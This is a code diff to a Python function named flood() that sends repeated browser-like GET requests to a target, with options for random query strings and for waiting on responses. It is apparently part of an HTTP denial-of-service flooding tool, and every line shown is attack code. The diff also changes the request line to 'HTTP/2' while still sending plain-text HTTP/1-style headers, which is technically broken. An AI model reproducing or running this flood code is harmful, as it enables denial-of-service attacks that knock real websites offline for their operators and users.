@@ -107,23 +107,23 @@ def flood():
             if fullhandshake == False:
                 if randqueries == False:
                     for x in range(rpc):
-                        connection.send(str.encode(f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
+                        connection.send(str.encode(f"GET {path} HTTP/2\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
                         rps += 1
             if fullhandshake == True:
                 if randqueries == False:
                     for x in range(rpc):
-                        connection.send(str.encode(f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
+                        connection.send(str.encode(f"GET {path} HTTP/2\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
                         connection.recv(1024).decode()
                         rps += 1
             if fullhandshake == False:
                 if randqueries == True:
                     for x in range(rpc):
-                        connection.send(str.encode(f"GET {path}{addquery}{RandomString()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
+                        connection.send(str.encode(f"GET {path}{addquery}{RandomString()} HTTP/2\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
                         rps += 1
             if fullhandshake == True:
                 if randqueries == True:
                     for x in range(rpc):
-                        connection.send(str.encode(f"GET {path}{addquery}{RandomString()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
+                        connection.send(str.encode(f"GET {path}{addquery}{RandomString()} HTTP/2\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
                         connection.recv(1024).decode()
                         rps += 1
         except:
